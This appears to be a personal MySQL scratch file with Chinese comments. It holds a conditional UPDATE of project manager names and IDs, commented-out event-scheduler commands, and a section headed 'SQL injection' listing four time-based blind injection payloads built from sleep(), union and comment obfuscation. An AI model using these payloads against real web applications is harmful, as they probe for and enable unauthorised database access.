# 更新指定行的数据；优化方案：在set的时候就判断
update cooperation_projects_clean
set project_manager = '钟马俊', project_manager_id = 'zwx996578', partner_manager = '钟马俊', partner_manager_id = 'zwx996578'
where
project_code = case substr(project_code, 4, 9) % 4
when 3 then project_code
end;

# 事件
-- SHOW VARIABLES LIKE 'event_scheduler'
-- SET GLOBAL event_scheduler = ON

# sql注入
(select*from(select+sleep(5)union/**/select+1)a);

select*from(select+sleep(5)union/**/select+1)a;

select+sleep(5) union 1;

(select+concat("q",sleep(3)));

